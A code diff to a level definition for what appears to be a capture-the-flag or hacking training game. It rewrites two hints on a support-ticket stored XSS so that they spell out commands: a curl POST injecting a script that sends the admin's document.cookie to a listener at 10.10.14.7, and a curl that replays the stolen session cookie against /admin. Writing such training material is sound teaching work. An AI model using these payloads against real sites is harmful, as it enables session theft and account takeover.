@@ -67,9 +67,9 @@ export const easyLevel5: ChainDef = {
       hints: [
         "Recon first — `nmap -sV <ip>`. Then check the web root for the ticket form itself.",
         "Read the page source carefully, not just what's visible — a comment left in the HTML can tell you exactly how ticket text gets handled downstream.",
-        "If comments render as-is in the admin queue, a `<script>` tag in a ticket comment runs in the admin's browser, not yours. Point it at your own listener and grab `document.cookie`.",
+        "If comments render as-is in the admin queue, a `<script>` tag in a ticket comment runs in the admin's browser, not yours. Try: `curl -X POST http://<ip>/support -d \"comment=<script>fetch('http://10.10.14.7/steal?c='+document.cookie)</script>\"` — that fetches your own listener with the admin's cookie attached.",
         "Give it a little in-story time for the admin to open the queue, then check your listener log for what came back.",
-        "You have a real session value now. Replay it as a `Cookie` header against `/admin` — you don't need a password if you have a live session.",
+        "You have a real session value now. Replay it as a `Cookie` header against `/admin` — you don't need a password if you have a live session: `curl -H \"Cookie: session=a1f9c2e7b04d\" http://<ip>/admin`.",
       ],
       debrief: [
         "root cause: /support rendered submitted ticket comments directly into the admin queue view with",
